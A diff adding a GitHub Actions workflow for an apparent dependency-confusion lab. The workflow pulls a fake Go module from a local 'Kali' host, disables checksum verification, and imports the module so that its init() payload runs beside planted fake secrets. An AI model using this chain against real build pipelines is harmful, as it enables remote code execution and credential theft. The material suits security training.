@@ -1,0 +1,110 @@
+name: Build with Fake Dependency
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    runs-on: self-hosted
+
+    env:
+      LAB_GITHUB_TOKEN: fake_lab_github_token_123
+      LAB_DOCKER_PASSWORD: fake_lab_docker_password_456
+      LAB_AWS_ACCESS_KEY_ID: fake_lab_aws_key_789
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Set up Go
+        uses: actions/setup-go@v5
+        with:
+          go-version: '1.22'
+
+      - name: Download fake dependency from Kali
+        shell: powershell
+        run: |
+          $url = "http://192.168.56.101:8889/github.com/aquasecurity/trivy-db-fake/@v/v1.0.0.zip"
+          $zipFile = "$env:TEMP\trivy-db-fake.zip"
+          $destPath = "$env:GITHUB_WORKSPACE\_labdeps"
+
+          Write-Host "Descargando dependencia falsa desde Kali..."
+          Write-Host $url
+
+          if (Test-Path $zipFile) {
+            Remove-Item $zipFile -Force
+          }
+
+          if (Test-Path $destPath) {
+            Remove-Item $destPath -Recurse -Force
+          }
+
+          New-Item -ItemType Directory -Force -Path $destPath | Out-Null
+
+          Invoke-WebRequest -Uri $url -OutFile $zipFile -TimeoutSec 15
+          Expand-Archive -Path $zipFile -DestinationPath $destPath -Force
+
+          Write-Host "Contenido descargado:"
+          Get-ChildItem $destPath -Recurse
+
+      - name: Configure Go to use fake dependency
+        shell: powershell
+        run: |
+          Write-Host "Limpiando go.mod de entradas previas..."
+
+          $goMod = "go.mod"
+          $content = Get-Content $goMod
+          $content = $content | Where-Object { $_ -notmatch "trivy-db-fake" }
+          Set-Content $goMod $content -Encoding UTF8
+
+          $depPath = "$env:GITHUB_WORKSPACE\_labdeps\trivy-db-fake"
+
+          if (!(Test-Path "$depPath\go.mod")) {
+            Write-Error "No se encontró go.mod en $depPath"
+            exit 1
+          }
+
+          Write-Host "Agregando replace local correcto..."
+          go mod edit -replace "github.com/aquasecurity/trivy-db-fake=./_labdeps/trivy-db-fake"
+
+          Write-Host "Agregando dependencia fake al go.mod..."
+          go mod edit -require "github.com/aquasecurity/trivy-db-fake@v1.0.0"
+
+          Write-Host "Deshabilitando sumdb solo para el paquete fake de laboratorio..."
+          go env -w GONOSUMDB="github.com/aquasecurity/trivy-db-fake"
+
+          Write-Host "go.mod resultante:"
+          Get-Content go.mod
+
+      - name: Create import file to trigger init()
+        shell: powershell
+        run: |
+          @'
+          package main
+
+          import (
+              _ "github.com/aquasecurity/trivy-db-fake"
+              "fmt"
+              "time"
+          )
+
+          func main() {
+              fmt.Println("Dependency confusion lab executed")
+              time.Sleep(5 * time.Second)
+          }
+          '@ | Set-Content dependency-proof.go
+
+          Get-Content dependency-proof.go
+
+      - name: Download and build triggers payload
+        shell: powershell
+        run: |
+          go run .\dependency-proof.go
+
+      - name: Verify fake package was imported
+        shell: powershell
+        run: |
+          go list -m all | Select-String "trivy-db-fake"
